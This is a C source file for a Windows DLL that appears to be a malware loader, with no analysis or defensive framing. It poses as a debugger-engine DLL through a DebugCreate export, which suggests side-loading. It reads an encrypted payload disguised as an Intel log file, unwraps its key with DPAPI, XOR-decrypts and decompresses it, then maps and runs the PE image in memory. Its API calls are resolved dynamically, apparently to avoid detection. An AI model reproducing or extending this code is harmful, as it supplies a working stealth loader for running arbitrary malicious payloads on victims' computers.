#include <windows.h>
#include "api.h"
#include "loader.h"

#define PAYLOAD_PATH "C:\\ProgramData\\Intel\\Logs\\Intel.log\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
#define PAYLOAD_SIZE 0x19000u


typedef void(__stdcall* EntryPoint)(PUCHAR, ULONG);

typedef struct __declspec(align(1)) {
    unsigned int uncompressed_len;
    unsigned int data_len;
    unsigned int encrypted_key_len;
    BYTE data;
} Payload, * PPayload;

int DecryptAndRun(Payload* buffer) {
    API api = { 0 };
    ResolveApi(&api);

    DATA_BLOB encrypted_key = { buffer->encrypted_key_len, &buffer->data };
    DATA_BLOB key = { 0 };

    if (!api.CRYPT32_CryptUnprotectData(&encrypted_key, NULL, NULL, NULL, NULL, 4, &key)) {
        api.KERNEL32_ExitProcess(ERROR_CANCELLED);
    }

    PUCHAR data = (PUCHAR)api.KERNEL32_VirtualAlloc(0, buffer->data_len, 4096, 4);
    if (!data) {
        return 12;
    }

    PUCHAR plain = data;
    PUCHAR encrypted = &buffer->data + buffer->encrypted_key_len;
    for (ULONG k = 0; k < buffer->data_len; ++k) {
        plain[k] = encrypted[k] ^ key.pbData[(k + 1) % 4];
    }

    PUCHAR p_uncompressed = (PUCHAR)api.KERNEL32_VirtualAlloc(0, buffer->uncompressed_len, 4096, 4);
    if (!p_uncompressed)
        return 12;

    ULONG final_len = 0;
    if (api.NTDLL_RtlDecompressBuffer(
        COMPRESSION_FORMAT_LZNT1,
        p_uncompressed, buffer->uncompressed_len,
        data,
        buffer->data_len,
        &final_len
    )) {
        return 13;
    }

    const FARPROC entry_point = LoadPE((IMAGE_DOS_HEADER*)p_uncompressed, &api);
    if (!((int(__stdcall*)(HINSTANCE, HINSTANCE, LPSTR, int))entry_point)(NULL, NULL, NULL, 0)) {
        return 21;
    }

    return WM_QUIT;
}

__declspec(dllexport)
HRESULT DebugCreate(const IID* const InterfaceId, PVOID* Interface) {
    Payload* buffer = (Payload*)VirtualAlloc(NULL, PAYLOAD_SIZE, MEM_COMMIT, PAGE_READWRITE);
    HANDLE hFile = CreateFileA(PAYLOAD_PATH, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD num_read = 0;
        ReadFile(hFile, buffer, PAYLOAD_SIZE, &num_read, NULL);
        CloseHandle(hFile);
        DecryptAndRun(buffer);
    }
    return 0;
}

__declspec(dllexport)
BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    return TRUE;
}